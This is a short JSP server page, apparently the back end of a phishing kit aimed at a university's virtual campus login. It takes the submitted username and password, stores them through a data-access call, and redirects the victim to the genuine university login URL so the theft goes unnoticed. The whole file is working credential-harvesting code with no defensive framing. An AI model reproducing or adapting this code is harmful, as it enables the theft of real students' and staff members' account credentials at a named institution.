<%@page import="dto.Datos_1"%>
<%@page import="con.test"%>
<%@page import="dao.datosDAO"%>
<%@page import="dto.datos"%>
<%
    String usuario = request.getParameter("txtuser");
    String contraseña = request.getParameter("txtpass");
    Datos_1 dat = new Datos_1();
    dat.setUsuario(usuario);
    dat.setContraseña(contraseña);
    try {
        datosDAO.agregar(dat);
        response.sendRedirect("https://campusvirtual.unf.edu.pe/login?ReturnUrl=%2Fconnect%2Fauthorize%2Fcallback%3Fclient_id%3Dintranet%26redirect_uri%3Dhttps%253A%252F%252Fintranet.unf.edu.pe%252Fsignin-oidc%26response_type%3Dcode%26scope%3Dopenid%2520profile%2520roles%26code_challenge%3DcGuuv15zxb7-Yr4ZwSE-FauGzV7ejdGcVc32RJqI4nM%26code_challenge_method%3DS256%26response_mode%3Dform_post%26nonce%3D637911651118461407.MmJkN2UwMDAtZDU3ZS00MmU3LTk0Y2EtNGI3MWUwY2FkZDFmOWE4NWNmOWEtMTFhYy00MWZmLTk0MTItNjcwZmVmYmY0NmNj%26state%3DCfDJ8O8hopQncCxJm4Y4BgjR7zbyvBoD7A0kOXuqlsIG46Hxj4k-FdKFitKLZmZKyjFDX7lAZsuWokLWZqXLPVWHirC4DPUGHY8_tQBZK2RnUs7kF1MO3gizIOPkV1zFpXyyvuFqN24PMyNSN9pm5MduebrryX0yh6Vq4Q6CiJwVEalzy6RlXkrAopurouQE4HDLVD8QfXac0NRPus0I_797-NE9HrxRkPTzc_WeUqcOSWW1WdKVFqadSdc4RDtLN5Sy3dMBct7SsSsDwQ-ZQkDeg-bEAzkaOxqDPiT2kBIZjT2hwyt-HHJczIjKaw9MnSk803FUPYDf-DT1HfxK_-R2DLp56KYTAOR1UCIz3-AFHeyncIxZyGug-sGGZmXUBI9jJw%26x-client-SKU%3DID_NETSTANDARD2_0%26x-client-ver%3D5.6.0.0");

    } catch (Exception e) {
        out.println(e.getMessage());
    }

%>